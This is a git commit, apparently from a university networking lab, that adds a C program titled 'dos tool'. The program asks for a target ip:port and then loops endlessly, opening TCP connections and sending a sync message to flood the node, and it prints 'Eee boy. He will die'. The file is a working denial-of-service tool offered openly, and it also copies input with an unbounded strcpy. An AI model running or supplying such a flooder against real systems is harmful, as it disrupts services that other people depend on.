dc55ace5724318439166943cb007812746ea9c14
reconrus <reconrus@yandex.ru>
2019-04-02 23:26:23 +0300

    dos tool

---
+++ lab10/dos.c
@@ -0,0 +1,69 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <memory.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <dirent.h> 
+
+#define SYNC 1
+
+void client_sync(char* node_info){
+    char node_copy[1024];
+    strcpy(node_copy, node_info); 
+    char* name = strtok(node_copy,":");
+    char* ip = strtok(NULL,":");
+    char* port = strtok(NULL, ":");
+
+    int sockfd = 0, 
+        sent_recv_bytes = 0;
+
+    struct sockaddr_in dest;
+    inet_aton(ip, &dest.sin_addr);
+    dest.sin_port = htons(atoi(port));
+    dest.sin_family = AF_INET;
+    
+    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    
+    if(connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr)) < 0) printf("Connection to %s:%s failed\n",ip,port);
+    else{ 
+        int type = SYNC;
+
+        sent_recv_bytes = sendto(sockfd, &type, sizeof(int), 0, (struct sockaddr *)&dest, sizeof(struct sockaddr));
+
+    }
+    close(sockfd);
+}
+
+
+int main(){
+    char target_info[128];
+    printf("Enter node that you would like to DoS in format ip:port\n");
+    scanf("%s", target_info);
+    char* ip = strtok(target_info,":");
+    char* port = strtok(NULL, ":");
+    struct sockaddr_in dest;
+    inet_aton(ip, &dest.sin_addr);
+    dest.sin_port = htons(atoi(port));
+    dest.sin_family = AF_INET;
+
+    int sockfd = 0, 
+        sent_recv_bytes = 0;
+
+    while(1){
+        sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if(connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr)) < 0) printf("Connection to %s:%s failed\n",ip,port);
+        else{ 
+            int type = SYNC;
+            sent_recv_bytes = sendto(sockfd, &type, sizeof(int), 0, (struct sockaddr *)&dest, sizeof(struct sockaddr));
+            printf("Eee boy. He will die\n");
+        }
+        close(sockfd);
+    }
+   
+    return 0;
+}
